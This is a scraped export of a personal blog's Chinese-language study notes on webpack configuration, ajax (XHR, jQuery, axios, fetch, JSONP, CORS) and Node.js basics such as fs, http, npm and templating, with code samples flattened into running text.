优化代码调试 source-map 生成环境性能优化 优化打包构建速度 OneOf babel缓存 多进程打包 externals dll 优化代码运行的性能 缓存(hash–chunkhash–contenthash) tree shaking code split 懒加载/预加载 pwa 4. webpack 配置详情 4.1 entry 入口起点 String -&gt; ‘./src/index.js’ 单入口 打包形成一个chunk 输出一个 bundle 文件 chunk 名称默认是 main array –&gt; [‘./src/index.js’, ‘./src/add.js’] 多入口 所有入口文件形成一个chunk 输出一个 bundle 文件 object -&gt; { index : ‘./src/index.js’, add: ‘./src/add.js’ } 多入口 几个入口就几个chunk 输出几个bundle chunk 名称为 key值 特殊用法 { ​ index :[‘./src/index.js’, ‘./src/add.js’], //一个chunk 一个bundle ​ add: ‘./src/add.js’ //一个chunk 一个bundle } 4.2 output 12345678910111213output: &#123; // 文件名称（指定名称+目录） filename: &#x27;js/[name].js&#x27;, // 输出文件目录（将来所有资源输出的公共目录） path: resolve(__dirname, &#x27;build&#x27;), // 所有资源引入公共路径前缀 --&gt; &#x27;imgs/a.jpg&#x27; --&gt; &#x27;/imgs/a.jpg&#x27; publicPath: &#x27;/&#x27;, chunkFilename: &#x27;js/[name]_chunk.js&#x27;, // 非入口 chunk 的名称 // library: &#x27;[name]&#x27;, // 整个库向外暴露的变量名 // libraryTarget: &#x27;window&#x27; // 变量名添加到哪个上 browser // libraryTarget: &#x27;global&#x27; // 变量名添加到哪个上 node // libraryTarget: &#x27;commonjs&#x27; &#125;, 4.3 module 1234567891011121314151617181920212223242526module: &#123; rules: [ // loader 的配置 &#123; test: /\\.css$/, // 多个 loader 用 use use: [&#x27;style-loader&#x27;, &#x27;css-loader&#x27;] &#125;, &#123; test: /\\.js$/, // 排除 node_modules 下的 js 文件 exclude: /node_modules/, // 只检查 src 下的 js 文件 include: resolve(__dirname, &#x27;src&#x27;), // 优先执行 enforce: &#x27;pre&#x27;, // 延后执行 // enforce: &#x27;post&#x27;, // 单个 loader 用 loader loader: &#x27;eslint-loader&#x27;, options: &#123;&#125; &#125;, &#123; // 以下配置只会生效一个 oneOf: [] &#125; ] &#125;, 4.4 resolve 12345678910resolve: &#123; // 配置解析模块路径别名: 优点简写路径 缺点路径没有提示 alias: &#123; $css: resolve(__dirname, &#x27;src/css&#x27;) &#125;, // 配置省略文件路径的后缀名 extensions: [&#x27;.js&#x27;, &#x27;.json&#x27;, &#x27;.jsx&#x27;, &#x27;.css&#x27;], // 告诉 webpack 解析模块是去找哪个目录 modules: [resolve(__dirname, &#x27;../../node_modules&#x27;), &#x27;node_modules&#x27;] &#125; 4.5 dev server 12345678910111213141516171819202122232425262728devServer: &#123; // 运行代码的目录 contentBase: resolve(__dirname, &#x27;build&#x27;), // 监视 contentBase 目录下的所有文件，一旦文件变化就会 reload watchContentBase: true, watchOptions: &#123; // 忽略文件 ignored: /node_modules/ &#125;, compress: true, // 启动 gzip 压缩 port: 5000, // 端口号 host: &#x27;localhost&#x27;, // 域名 open: true, // 自动打开浏览器 hot: true, // 开启 HMR 功能 clientLogLevel: &#x27;none&#x27;, // 不要显示启动服务器日志信息 // 除了一些基本启动信息以外，其他内容都不要显示 quiet: true, overlay: false,// 如果出错了，不要全屏提示~ // 服务器代理 --&gt; 解决开发环境跨域问题 proxy: &#123; // 一旦 devServer(5000)服务器接受到 /api/xxx 的请求，就会把请求转发到另外一个服务器 (3000) &#x27;/api&#x27;: &#123; target: &#x27;http://localhost:3000&#x27;, // 发送请求时，请求路径重写：将 /api/xxx --&gt; /xxx （去掉/api） pathRewrite: &#123; &#x27;^/api&#x27;: &#x27;&#x27; &#125; &#125; &#125;&#125; 4.6 optimization 12345678910111213141516171819202122optimization: &#123; splitChunks: &#123; chunks: &#x27;all&#x27; // 后面默认值，可以不写~ &#125;, // 将当前模块的记录其他模块的 hash 单独打包为一个文件 runtime // 解决：修改 a 文件导致 b 文件的 contenthash 变化 runtimeChunk: &#123; name: entrypoint =&gt; `runtime-$&#123;entrypoint.name&#125;` &#125;, minimizer: [ // 配置生产环境的压缩方案：js 和 css new TerserWebpackPlugin(&#123; // 开启缓存 cache: true, // 开启多进程打包 parallel: true, // 启动 source-map sourceMap: true &#125;) ] &#125;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://shylees.github.io/tags/webpack/"}]},{"title":"ajax 学习笔记","slug":"ajax","date":"2021-09-08T16:00:00.000Z","updated":"2021-09-09T16:00:00.000Z","comments":false,"path":"learningNotes/ajax","link":"learningNotes/ajax","permalink":"https://shylees.github.io/learningNotes/ajax","excerpt":"","text":"1.简介 1.1 ajax ajax(asynchronous javascript and xml)，即异步 JS 和 XML 通过 ajax 可以在浏览器中向服务器发送异步请求，最大的优势 –&gt; 无刷新获取数据 ajax 是一种将现有标准组合在一起使用的新方式 1.2 xml xml 可扩展标记语言 被设计用来传输和存储数据 与 html 类似，不同的是 html 中都是预定义标签，而 xml 没有预定于标签，全部是自定义标签，用了表示一些数据 1.3 json 现在 xml 已经的传输和存储数据的功能已经被 json 取代了 1.4 ajax 的特点 1.4.1 优点 可以无需刷新页面与服务端进行通信 允许根据用户事件来更新部分页面内容 1.4.2 缺点 没有浏览历史，不能回退 存在跨域问题（同源） seo（爬虫） 不友好 2. http 报文 2.1 http hypertext transport protocol 超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则 2.2 请求报文 重点：格式、参数 行 : POST /s?ie=utf-8 HTTP/1.1 头 : Host: … ​ Cookie: name=… ​ Content-type:application/x-www-form-urlencoded ​ User-Agent:chrome 83 空行 : 体 : username=admin&amp;password=admin 2.3 响应报文 行 : HTTP/1.1 200 OK 头 : Content-type: text/html;charset=utf-8 ​ Content-length:2048 ​ Content-encoding:gzip 空行 : 体 : &lt;html&gt;....&lt;/html&gt; 2.4 network 上的请求响应 Headers：请求内容 General Response Headers：响应头和行 Requset Headers：请求头和行 Query String Parameters：请求体 get ： 查询字符串的键值对 post：查询字符串 Preview：预览响应过来的html Response：响应的内容 3. ajax的使用 3.1 node express 的使用 使用node express搭建服务器 1234567891011import express from &#x27;express&#x27;;const app = express();app.get(&#x27;/&#x27;, (request, response) =&gt; &#123; response.send(&#x27;hello express&#x27;);&#125;)app.listen(8000, () =&gt; &#123; console.log(&quot;8000端口监听...&quot;);&#125;) 3.2 原生ajax使用 创建对象 1const xhr = new XMLHttpRequest(); 初始化 设置请求方法和url 1xhr.open(&#x27;GET&#x27;,&#x27;http://127.0.0.1:8000/server&#x27;); 发送 设置参数 12xhr.send();xhr.send(&#x27;a=10&amp;b=20&#x27;); 事件绑定 处理服务端返回的结果 1xhr.onreadystatechange = function()&#123;...&#125; 其中 readystate 是 xhr 对象的属性， 其值为 0:初始状态 1:open后 2:send后 3:返回部分数据 4:返回全部数据 其中 xhr的对象 state:状态码 statusText:状态字符串 getAllResponseHeader():所有响应头 response:响应体 服务器端要做的操作：解决跨域问题 1response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;,&#x27;*&#x27;); if 设置请求头 : 在send前 12xhr.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;)xhr.setRequestHeader(&#x27;name&#x27;,&#x27;lee&#x27;) 则 要在服务器端 设置允许的响应头： 1response.setHeader(&#x27;Access-Control-Allow-Headers&#x27;,&#x27;*&#x27;); if 处理后端传的字符串json数据 服务器 123const data = &#123; name : &#x27;lee&#x27; &#125;let str = JSON.stringify(data);response.send(str) 前端处理 手动转换数据格式： 12let data = JSON.parse(xhr.response);res.value = data.name; 自动转换： 1234//在open前 设置响应体数据的类型xhr.responseType = &#x27;json&#x27;//在事件里直接使用就可以了res.value = xhr.response.name; 解决ie缓存问题：在open中加时间戳 保证每次发生的请求都不一样 1xhr.open(&#x27;GET&#x27;,&#x27;http://127.0.0.1:8000/ie?t=&#x27; + Date.now()); 处理请求异常 服务器可以设置一个定时器，三秒后才返回响应 在open前： 123456//超时设置 xhr.timeout = 2000;//超时回调 xhr.ontimeout = function()&#123; alert(&#x27;网络异常，请稍后重试&#x27;) &#125;//网络异常回调 可以在f12 使用offline 测试xhr.onerror = function()&#123; alert(&#x27;你的网络似乎出现了问题&#x27;) &#125; 取消发送请求事件 1234let x = null;//发送请求 x 为 前面的xhr对象//使用 x.abort() 可以取消发送请求//利用这个方法可以处理 多次发送请求 只保留一个请求的情况 3.2.1 原生ajax案例 – 点击按钮 将响应的数据放在文本框里 3.3 jquery 中的 ajax get/post请求 $.get/post(url, data请求携带的参数, callback成功时的回调函数, type返回数据格式) 后面三个参数可选填 123$.get(&#x27;http://127.0.0.1:8000/jq-server&#x27;, &#123;a:10,b:20&#125;, function(data)&#123; log(data);&#125;,&#x27;json&#x27;) ajax通用请求 123456789101112 $.ajax(&#123; url:&#x27;http://127.0.0.1:8000/delay&#x27;, //url data: &#123;a:10,b:20&#125;, //参数 type: &#x27;GET&#x27;, //请求类型 dataType:&#x27;json&#x27;, //响应体结果 success:function(data)&#123; //成功回调 log(data); &#125;, timeout:2000, //超时回调 error:function()&#123;...&#125; //失败回调 headers:&#123;...&#125; //自定义头部&#125;) 3.4 axios 导入axios加载文件 bootcdn axios可以配置 baseURL 1axios.defaults.baseURL = &#x27;http://127.0.0.1:8000&#x27;; axios使用 返回promise对象 get请求: axios.get(url [, config] ) post请求: axios.post(url [, data [, config]] ) //第二个是请求体参数 axios请求: axios(config) 12345678910 axios.get(&#x27;/axios-server&#x27;,&#123; params:&#123; //url参数 id:100, vip:7 &#125;, headers:&#123; //请求头信息 name:&#x27;lee&#x27;, age:&#x27;20&#x27; &#125;&#125;).then(value =&gt; &#123; ... &#125; ) 12345678910 axios.post(&#x27;/axios-server&#x27;,&#123; username:&#x27;admin&#x27;, password:&#x27;admin&#x27; &#125;,&#123; params:&#123; //url参数 id:100, vip:7 &#125;, headers:&#123; //请求头信息 name:&#x27;lee&#x27;, age:&#x27;20&#x27; &#125;&#125;).then(value =&gt; &#123; ... &#125; ) 1234567axios(&#123; method:&#x27;POST&#x27;, //请求方法 url:&#x27;/axios-server&#x27;, //url params:&#123;id:100, vip:7 &#125;, //url参数 headers:&#123; a=10, b=20 &#125;, //头信息 data:&#123; username:&#x27;admin&#x27;, password:&#x27;admin&#x27; &#125;, //请求体参数&#125;).then( res =&gt; &#123; log(res) &#125; ) 3.5 fetch 12345678910fetch(&#x27;http://127.0.0.1:8000/fecth-server?vip=10&#x27;,&#123; method:&#x27;POST&#x27;, //请求方法 headers:&#123; name:&#x27;lee&#x27; &#125;, //请求头 body:&#x27;username=admin&amp;password=admin&#x27; //请求体&#125;).then(res =&gt; &#123; return res.text(); //字符串 return res.json(); //json&#125;).then(res =&gt; &#123; console.log(res)&#125;) 4. 跨域问题 4.1同源策略 浏览器的一种安全策略 同源：协议、域名、端口号完全相同 违背同源策略就是跨域 4.2 同源的一个例子 html页面跟 发送请求时同一个地址 123456789//server.js...app.get(&#x27;/home&#x27;,(req,res) =&gt; &#123; res.sendFile(__dirname + &#x27;/index.html&#x27;); //响应一个页面&#125;)app.get(&#x27;/data&#x27;,(req,res) =&gt; &#123; res.send(&#x27;用户数据&#x27;); //请求数据&#125;) 1234567891011//index.html...btn.onlick = function()&#123; const xhr = new XMLHttpRequest(); // 因为是同源的 所以url 可以简写 xhr.open(&#x27;GET&#x27;,&#x27;/data&#x27;); xhr.send(); xhr.onreadystatechange = function()&#123; ... &#125;&#125; 4.3 jsonp 原理 主要就是利用了 script 标签的src没有跨域限制来完成的 缺点： 只能进行GET请求 优点： 兼容性好，在一些古老的浏览器中都可以运行 12345678910//server.jsapp.all(&#x27;/jsonp&#x27;, (req, res) =&gt; &#123; // res.send(&#x27;console.log(hello jsonp)&#x27;) const data = &#123; name: &#x27;lee&#x27; &#125; res.end(`handle($&#123;JSON.stringify(data)&#125;)`);&#125;) 12345678//html&lt;script&gt; function handle(data) &#123; const res = document.querySelector(&#x27;div&#x27;); res.innerHTML = data.name; &#125;&lt;/script&gt;&lt;script src=&quot;http://127.0.0.1:8000/jsonp&quot;&gt;&lt;/script&gt; 4.4 jsonp 实践 1234567891011//serverapp.all(&#x27;/jsonp-exe&#x27;, (req, res) =&gt; &#123; // res.send(&#x27;console.log(hello jsonp)&#x27;) const data = &#123; exist: 1, mes: &#x27;用户名存在&#x27; &#125; res.end(`handle($&#123;JSON.stringify(data)&#125;)`);&#125;) 12345678910111213141516171819&lt;script&gt; const p = document.querySelector(&#x27;p&#x27;) const input = document.querySelector(&#x27;input&#x27;) function handle(data) &#123; input.style.border = &#x27;1px solid red&#x27;; p.innerHTML = data.mes; &#125; input.onblur = function () &#123; // 获取用户的输入 let username = this.value; // 向服务器发送请求 检测用户是否存在 // 1.创建script const script = document.createElement(&#x27;script&#x27;); // 2.设置标签 src script.src = &#x27;http://127.0.0.1:8000/jsonp-exe&#x27;; // 3.插入到dom document.body.appendChild(script); &#125;&lt;/script&gt; 4.5 jq-jsonp 4.6 cors 1234567891011//serverapp.all(&#x27;/cors&#x27;, (req, res) =&gt; &#123; // 1.设置响应头，允许跨域 res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;); // 2.设置响应头 res.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;*&#x27;); res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;, &#x27;*&#x27;); // 3.响应体 res.send(&#x27;hello cors&#x27;);&#125;) 123456789101112131415&lt;script&gt; const btn = document.querySelector(&#x27;button&#x27;) const text = document.querySelector(&#x27;textarea&#x27;) btn.onclick = function () &#123; const xhr = new XMLHttpRequest(); xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/cors&#x27;); xhr.send(); xhr.onreadystatechange = function () &#123; if (xhr.readyState === 4) &#123; text.value = xhr.response &#125; &#125; &#125;&lt;/script&gt;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"}]},{"title":"nodejs 学习笔记","slug":"nodejs","date":"2021-08-15T16:00:00.000Z","updated":"2021-08-22T16:00:00.000Z","comments":false,"path":"learningNotes/nodejs","link":"learningNotes/nodejs","permalink":"https://shylees.github.io/learningNotes/nodejs","excerpt":"","text":"0.其他知识点 0.1 代码风格 JavaScript Standard Style Airbnb JavaScript style if 使用 五分号风格 只要注意在 当每一行是以 ( [ ` 这3个开头时 前要补空格 ``打印字符 es6 模板字符串 支持 换行 方便拼接 快捷键：选择长度不等 alt 选 放开 ctrl + 向右 ​ 选相同的：先选中 然后 ctrl + d 0.2 浏览器收到html响应的解析过程 从上到下依次解析，当在解析的过程中，如果发现有： link、script、img、iframe、video、audio 等 带有 src 或者 href(除 a ) 这种具有外链的资源 属性的标签时 浏览器会自动对这些资源发起新的请求 0.3 相对路径的 ./ 文件操作中的相对路径可以省略 ./ 使用的所有文件操作的 api 都是异步的 fs.readFile(‘data/a.txt’, …) 在模块加载中 相对路径不能省略 ./ require(‘./data/foo.js’) if 只有 / 则会找到 根目录 ‘C: …’ 绝对路径 0.4 修改完代码自动重启服务器 使用第三方命令行工具 nodemon 解决 其是 基于 node.js 开发的第三方工具 需要全局安装 安装 ：npm install --global nodemon 使用 ：nodemon app.js 用nodemon 代替 node 启动文件 会监视文件变化 然后自动重启服务器 0.5 回调函数:获取异步操作的结果 如果需要获取一个函数中异步操作的结果，则必须通过回调函数来获取 学node的精华所在 封装异步 api 5.6中有案例 123456789101112function fn(callback)&#123; //callback = function(data)&#123; console.log(data) &#125; setTimeout(function()&#123; let data = &#x27;hello&#x27;; callback(data); &#125;,1000)&#125;// 外部得到 datafn(function(data)&#123; console.log(data);&#125;) 0.6 npm package.js npm node package manager package.js 包描述文件 (项目说明书) npm 下载东西的时候 加 - - save (保存项目第三方包的依赖信息 dependencies) 可以在终端 npm init 初始化项目 创建 当把node_mouldes 文件夹删除后 因为有 package.js 中的依赖信息 所以直接终端 npm install 就会重新下回来 0.6.1 npm 网站 官方网站 第三方包 在哪来的 可以搜索下载上传第三方包 0.6.2 npm 命令行工具 npm 第二层含义就是 命令行工具 只要安装node就安装了npm 查版本号 : npm --version 升级 npm : npm install --global npm 0.6.3 常用命令 生成项目 : npm init npm init --yes 跳过向导 快速生成 下载第三方包 : npm install npm install 包名 npm install --save 删除包 : npm uninstall 包 只删除 if有依赖项就会保存 ​ npm uninstall --save 包 删除包 以及其依赖项 查看使用帮助 : npm --help 查看指定命令使用帮助 : npm 命令 --help 查看npm配置信息 : npm config list 0.6.4 解决 npm 被墙问题 使用淘宝镜像 cnpm npm 服务器在国外 安装 cnpm npm install --global cnpm cnpm直接替换 命令 npm if 不想下cnpm 可以每次这样使用 npm install jquery --registry=https://registry.npm.taobao.org 也可以将npm config set registry=https://registry.npm.taobao.org 这个配置到文件中 每次 npm就会使用cnpm 0.7 package-lock.json npm 5 后，在安装包的时候，npm就会生成或者更新 package-lock.json这个文件 npm5 后安装包 不需要加 --save 都会自动保存依赖信息 当安装包时 会自动创建或更新这个文件 (在项目的根目录下) 改文件会保存 node_modules 中所有包的信息(版本、下载地址) 这样的话 重新 npm install 时 速度可以提升 lock -&gt; 锁 锁定版本： 正常来说 项目依赖了 1.1.1,在重新下载时 会下载最新版本,但希望可以锁住版本，改文件就可以锁住版本号，防止自动升级 0.8 find 和 findIndex 的原理 es6 新增的方法 接收一个方法作为参数 方法内有一个返回条件 find 会遍历所有元素 执行给的带有条件返回值的函数 if 符合改条件的元素会作为find方法的返回值 if 无符号 就返回 undefined find 和 findIndex 原理： 123456789101112131415161718192021const users = [ &#123;id:1,name:&#x27;lili&#x27;&#125;, &#123;id:2,name:&#x27;lii&#x27;&#125;, &#123;id:3,name:&#x27;li&#x27;&#125;]Array.prototype.myFind = function(conditionFunc)&#123; //conditionFunc = function(item index)&#123; return item.id === 2&#125; for(let i = 0; i &lt; this.length; i++ )&#123; if( conditionFunc(this[i],i) )&#123; //this[i] = item ，i= index return this[i]; //if return i 就是 findIndex &#125; &#125;&#125;const ret = users.myFind(function(item,index)&#123; return item.id === 2;&#125;)console.log(ret); //&#123;id:2,name:&#x27;lii&#x27;&#125;//使用arr.find(function(item)&#123; return item.id === id&#125;) 0.9 reduce [1,2,3].reduce( (prev,curr) =&gt; { return prev + curr} ) //6相加 1. node.js介绍 1.1 能做什么 web 服务器后台 命令行工具 npm - node git - c hexo - node … 前端接触最多的就是命令行工具，主要是用第三方的 webpack gulp npm 1.2 预备知识 html -&gt; css -&gt; js -&gt; 简单命令行操作 -&gt; 服务端开发经验更好 1.3 资源 &lt;深入浅出 node.js&gt; 偏理论，无实战内容 对理解底层有帮助 可结合课程看 &lt;node.js 权威指南&gt; api 讲解 无实战 JavaScript 标准参考教程(alpha) : http://javascript.ruanyifeng.com/ node 入门 : https://www.nodebeginner.org/index-zh-cn.html 官方 api 文档 ：https://nodejs.org/dist/latest-v6.x/docs/api/ 中文文档 (版本较旧) ：http://www.nodeclass.com/api/node.html CNODE 社区 ：https://cnodejs.org CNODE - 新手入门 ：http://cnodejs.org/getstart es6 ： &lt;ECMAScript 6 入门&gt; —阮一峰 ​ &lt;深入理解 ES6&gt; — 尼古拉斯 1.4 这门课程能学到的东西 b/s 编程模型 Browser - Server back - end 任何服务端技术 的 bs 编程模型都是一样的，和语言无关 node 只是作为学习 bs 编程模型的一个工具 模块化编程 RequireJS SeaJS @import('文件路径') node 常用 api 异步编程 回调函数 Promise async generator Express Web开发框架 Ecmascript6 课程中穿插讲解 … 2. 起步 2.1 安装 node 环境 查看版本号 下载： 官网 -&gt; 安装 -&gt; 确认安装是否成功 -&gt; 环境变量 2.2 node 执行 js 文件 cmd 打开到 js 文件所在的文件夹 使用 node 文件名.js运行 js 文件 文件名 不要用 node.js if 用这个 node node.js 就会打开文件 最好不使用中文 2.3 node 特点(与浏览器相比) 2.3.1 ecmascript 解析执行JavaScript 无 dom bom window document is not defined 2.3.2 核心模块 在使用前都需要 const mondel = require(‘模块名称’) 官网api 可以看到核心模块 常用 ： fs os path request http 例子： 可以读写文件 读： 1.使用requirt 加载 fs 核心模块 2.使用fs.readFile 读取文件 12345678910//第一个参数 读取的文件路径//第二个参数 回调函数 =&gt; error 读失败 error错误对象; 读成功 error=null// data 读失败 error错误对象; 读成功 data 读取到的数据// 因为数据 是 二进制 转为 16进制 的 ，如果要看懂的话 要用toStringconst fs = require(&quot;fs&quot;);fs.readFile(&#x27;../nodejs.md&#x27;, function (error, data) &#123; // console.log(data); console.log(data.toString());&#125;); 写： 1.使用requirt 加载 fs 核心模块 2.使用fs.writeFile 读取文件 要自己创建文件夹 1234567891011// 第一个参数 文件路径// 第二个参数 文件内容// 第三个参数 回调函数 其参数error =&gt; 成功 error=null 失败 error=错误对象const fs = require(&quot;fs&quot;);fs.writeFile(&#x27;./data/01writefile&#x27;, &#x27;2021.08.16 to learn file&#x27;, function (error) &#123; if (error) &#123; console.log(&quot;ok 200&quot;); &#125; else &#123; console.log(error); &#125;&#125;) http 使用node非常轻松的构建一个web服务器 在node中专门提供了一个核心模块：http - 职责 就是帮你创建编写服务器的 1.加载核心模块 http 2.使用http.createServer() 创建一个web服务器 返回一个Server实例 3.服务器的用处 提供对数据的服务 -&gt; 发请求 -&gt; 接收请求 -&gt; 处理请求 -&gt; 发送响应 注册request请求事件 当客户端请求过来 会自动触发服务器的request请求事件，执行回调函数 回调函数有两个对象参数 request，response requset.url 会把http://127.0.0.1:3000 后面的东西返回到终端 只要每次触发request就会 response.write() 会把括号内的 字符串 响应到客户端 可以用多次 但是最后要加response.end() 也可以直接在 response.end(“响应数据”) 响应数据只能是二进制数据 或者 字符串 可以利用 不同的 request.url 响应不同的 write内容到客户端 response.setHeader(‘Content-Type’, ‘text/plain;charset=utf-8’); 解决乱码 在http 协议中 Content-Type 是 数据内容的类型 oschina 网站 查表 text/plain：普通文本 ； text/html：html ；image/jpeg：jpg (不用指定编码 只有字符数据要)； 4.绑定端口号，启动服务器 12345678910111213141516171819const http = require(&quot;http&quot;);let server = http.createServer();server.on(&#x27;request&#x27;, function (request, response) &#123; // 解决乱码问题 浏览器在不知道什么编码时 会用操作系统的默认编码 gbk response.setHeader(&#x27;Content-Type&#x27;, &#x27;text/plain;charset=utf-8&#x27;); console.log(&quot;200 ok + url: &quot; + request.url); if (request.url == &#x27;/&#x27;) &#123; response.write(&#x27;index&#x27;); &#125; else &#123; response.write(&#x27;other&#x27;); &#125; response.end()&#125;)server.listen(3000, function () &#123; //因为启动需要时间 所以整一个回调函数 console.log(&quot;服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问&quot;);&#125;) 此时在终端运行文件后 会打印listen的内容 表启动了服务器 此时 如果用浏览器打开 访问 就会触发request请求 可以用 crtl + c 结束服务器 加上request 和 response 后 利用 服务器的 response 响应页面 与 fs 核心模块 配合使用 到对应的url 就读相应文件 然后响应到客户端上 12345678910111213141516171819202122232425const http = require(&quot;http&quot;);const fs = require(&quot;fs&quot;);let server = http.createServer();server.on(&#x27;request&#x27;, function (request, response) &#123; response.setHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=utf-8&quot;); console.log(&quot;访问路径为: &quot; + request.url); if (request.url == &#x27;/index&#x27;) &#123; fs.readFile(&#x27;./view/learn.html&#x27;, function (err, data) &#123; if (err) &#123; console.log(&quot;文件读取失败 请稍后重试&quot;); &#125; else &#123; response.setHeader(&quot;Content-Type&quot;, &quot;text/html;charset=utf-8&quot;); response.end(data) &#125; &#125;) &#125; else &#123; response.end(&quot;其他&quot;) &#125;&#125;)server.listen(3000, function () &#123; console.log(&quot;服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问&quot;);&#125;) 2.3.3 第三方模块 2.3.4 用户自定义模块 node 中只有 模块作用域 require 作用 ：用来加载模块执行代码 (1.具名的核心模块 fs… 2.用户自己编写的文件模块 ./… ./不能省略 后缀名可以省 ) ​ 拿到模块中的导出对象 2.4 ip地址和端口号 网卡：只有一个 同一个局域网中 网卡的地址唯一 通过唯一的ip地址来进行定位 ip 地址 用来定位计算机 端口号 用来定位具体的应用程序 所有需要联网的应该程序都会占用一个端口号 端口号的范围 0 - 65536 之间 不要用到默认端口号 核心模块 http 中 const http = require(‘http’) 创建server let server = http.createServer() 监听request 请求事件 server.on(‘request’,function(request , response){…}) 请求url : request.url 请求我的客户端端口号 : request.socket.remotePort 请求我的客户端地址 ip+port : request.socket.remoteAddress 2.5 服务端渲染 和 客户端渲染 服务端渲染 页面刷新 服务端渲染 网页源码有 只请求一次 响应的就是页面最终结果 客户端渲染 点击页面不刷新 ajax 异步请求 数据信息在开发者工具才能看到 两次请求 第一次 拿到页面 第二次 拿到动态数据 再将数据渲染到页面上 2.5 REPL 在终端直接输入node 回车 就可以测试 node 代码 read eval print loop 3. 模板引擎 to 字符串替换 art-template 官网 3.1 安装 1npm install art-template --save 3.2 在 html 浏览器中使用 模板引擎不关心 字符串的内容 只关心自己认识的模板标记语法 例如 mustache 语法 &#123;&#123;&#125;&#125;` 1. 安装 2. 导入 lib/template-web.js 3. 写 text/template id='bbb' 的模板 4. 写 `template('bbb'&#123;…&#125;)` 即模板的`&#123;&#123;&#125;&#125; 里的数据 123456789101112&lt;body&gt; &lt;script src=&quot;node_modules/art-template/lib/template-web.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/template&quot; id=&#x27;tpl&#x27;&gt; 我叫&#123;&#123;name&#125;&#125; &lt;/script&gt; &lt;script&gt; const ret = template(&#x27;tpl&#x27;, &#123; name: &quot;lsy&quot; &#125;) console.log(ret); //模板引擎里面的内容 &lt;/script&gt;&lt;/body&gt; 3.3 在 node 中使用 模板最早诞生于服务器领域 后来才发展到了前端 安装 加载 art-template 查文档 使用api 123456const template = require(&quot;art-template&quot;);const str = `&lt;p&gt; hello 我是 &#123;&#123;name&#125;&#125; &lt;/p&gt;`let ret = template.render(str, &#123; name: &#x27;lsy&#x27;&#125;)console.log(ret); 将模板作为html 导入的写法 并且替换html 响应到页面上 123456//./02-data.html...&lt;body&gt; &lt;p&gt;hello 我是&#123;&#123;name&#125;&#125;&lt;/p&gt;&lt;/body&gt;... 1234567891011121314151617181920const template = require(&quot;art-template&quot;);const fs = require(&quot;fs&quot;);const http = require(&quot;http&quot;);let server = http.createServer();server.on(&#x27;request&#x27;, function (request, response) &#123; fs.readFile(&#x27;./02-data.html&#x27;, function (err, data) &#123; if (err) &#123; return console.log(&quot;文件读取失败&quot;); &#125; let ret = template.render(data.toString(), &#123; name: &#x27;lsy&#x27; &#125;) // console.log(ret); response.end(ret) &#125;)&#125;)server.listen(&#x27;3000&#x27;, function () &#123; console.log(&#x27;running...&#x27;);&#125;) 3.4 发表留言的例子 3.4.1 目录结构： ’ &gt; node_modules : ’ &gt; public : 把所有静态资源都放在这 ​ ’ &gt; css ​ ’ &gt; img ​ ’ &gt; js ​ ’ &gt; lib : jquery.js 这种第三方文件 ’ &gt; views : 所有 html 文件 ’ &gt; app.js : 后端业务 3.4.2 表单中需要提交的表单控件元素 必须具有 name 属性 表单提交分为：1.默认的提交行为 2.表单异步提交 action 表单提交的地址 == 请求的 url method 请求方法 3.4.3 url 核心模块 url.parse(‘…url…’ ，true) : 将…url… 解析为一个方便接受的对象 ； ​ 第二个参数==true时，会将查询字符串 query 拆成对象 否则为字符串 3.4.4 重定向 状态码设置为 302 临时重定向 在响应头通过 Location 通知客户端重定向的地址 res.statusCode = 302; res.setHeader(‘Location’, ‘/’); res.end(); 如果客户端 发现服务器的响应的状态码是302 就会去自动找响应头中找 Location 对应的url 所以就可以看到客户端自动跳转 3.4.5 each art-template 的专属each 模板语法 123&#123;&#123;each 数组&#125;&#125;&lt;li&gt;&#123;&#123; $value &#125;&#125;&lt;/li&gt;&#123;&#123;/each&#125;&#125; es5 的 forEach 1234//ie 8 不支持[&#x27;abc&#x27;,&#x27;d&#x27;,&#x27;efg&#x27;].forEach(function(item,index)&#123; &#125;) 遍历 jq 元素 1234//jq 2.0 以下 可以兼容ie 低版本$.each([&#x27;abc&#x27;,&#x27;d&#x27;,&#x27;efg&#x27;],function(index,item)&#123; &#125;) 伪数组的遍历 eg：$(‘div’) 伪数组是对象 对象的原型链Object.prototype 中没有forEach 不能用 如果要用的话 看下面 1234//这个 each 是 jq 提供的 是在 jq 的原型链中的$(&#x27;div&#x27;).each(function()&#123;&#125;)//或者可以用forEach[].slice.call($(&#x27;div&#x27;)).forEach(function()&#123;&#125;) 4. Node 中的模块系统 使用 node 编写应用程序 主要就是在使用： EcmaScript 语言 核心模块 第三方模块 自定义模块 4.1 模块化 文件作用域 通信规则 加载 require 导出 4.2 CommonJS 模块规范 模块作用域 加载模块 require 1require(&#x27;文件url&#x27;) 导出模块成员 exports 123456//导出多个成员export.a = &#x27;...&#x27;;export.b = &#x27;...&#x27;;...//导出单个成员 后面会覆盖前面module.exports = &#x27;...&#x27; 原理： 1234567891011//里面有隐藏的let module = &#123; exports:&#123; ... &#125;&#125;;let exports = module.exports;return module.exports; //导出单个成员 不能export = &#x27;...&#x27; 这样就会指向另一个对象 导出的数据就不对了// 即 给 exports 和 module.exports 赋值都会断开引用 4.3 require 加载机制 优先从缓存加载 -&gt; 核心模块 -&gt; 路径形式的文件模块 -&gt; 第三方模块… 更加底层的在 《深入浅出node.js》模块化 require(‘模块标识符’) : 核心模块/第三方模块/自定义模块 if 第三方模块 通过 npm 下载 使用时 通过 require(“包名”) 进行加载 不可能有一个第三方包与核心模块的名字相同 既不是核心模块 也不是路径的时候 会 (eg：art-template) 找到当前文件所在目录中的 node_modules 目录 再依次找到 node_modules/art-template/package.json 文件中的 main(: ‘index.js’) 属性 if 没有 package.json 或者没有main ,就会自动找 index.js (默认备选项) main 